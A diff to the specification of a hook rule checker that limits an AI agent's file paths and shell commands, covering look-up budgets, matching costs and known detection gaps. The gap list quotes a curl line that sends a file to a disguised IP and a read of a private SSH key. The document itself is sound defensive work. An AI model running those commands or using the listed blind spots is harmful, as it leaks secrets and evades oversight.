@@ -329,8 +329,8 @@ a search's `tool_input.file_path` (a search with none counts as outside). `~`, `
 root and the path resolve through their longest existing folder by `lstat` and `readlink` (links
 followed, at most 32 hops), the missing rest joined as text. Every doubt counts as outside: no
 roots, more than 32, none usable (a usable root is an absolute path other than `/`), a path or root that does not
-resolve, or the hook's look-up budget spent (4,000 steps, shared with the step record's own
-look-ups). A path outside every root as written and as resolved is outside with no disk call for
+resolve, or the hook's look-up budget spent (4,000 steps; the step record makes look-ups of its
+own on shell hooks only, where no scope runs, so a hook spends one such budget at most). A path outside every root as written and as resolved is outside with no disk call for
 it. Inside means every walk of the path (as sent and, with `..`, as folded) ends inside a resolved
 root, letter for letter: on a Mac, where `/tmp` links to `/private/tmp`, a path `/private/tmp/w/f`
 is inside a root `/tmp/w`. `rules check` refuses `path_scope` in a `then` table,
@@ -389,7 +389,7 @@ command, inside the hook client's 0.5 s wait, so two limits keep a hook short. W
 read, it may ask for at most 200 units of matching work in all: a clause with path patterns 2, a
 pattern without `/` 1, a pattern with `/` 4 plus 12 for each `**` (an unanchored pattern has one
 more) plus 1 for each folder or name past the fourth, a clause with `path_scope` 2 (V5c), R1's
-`after` twice because it runs twice. The packaged default uses 31, `example.toml` 119. When a hook
+`after` twice because it runs twice. The packaged default uses 31, `example.toml` 152. When a hook
 runs, the work that grows with the command, floating folder patterns (one that may start at any
 folder, such as `secrets/**`), command-list entries (a `--name*` entry once for each long flag of
 the command it may match) and the `pipe_into` walk (one step for each link it follows), shares one
@@ -1179,7 +1179,9 @@ Other measures:
     (`curl -d @f --resolve localhost:80:203.0.113.5 http://localhost` sends to
     that address): rule 5 and R1 read the URL's host only;
   - a private key with a name of its own, read by a relative path (`cat mykey`
-    in `~/.ssh`): rule 1 knows the default key names only.
+    in `~/.ssh`): rule 1 knows the default key names only;
+  - a file four or more folders under `.github/workflows/`: rule 7 lists three
+    depths, since a `**` there would be tried at every folder of the path.
 - False alarms the same fields raise, toward firing: `curl -XGET x.example`
   fires rule 5 (a cluster's letters are flags, so `-XGET` holds `-T`);
   `curl -d "$BODY" http://localhost:3000` fires rule 5 (a `$` in the matched
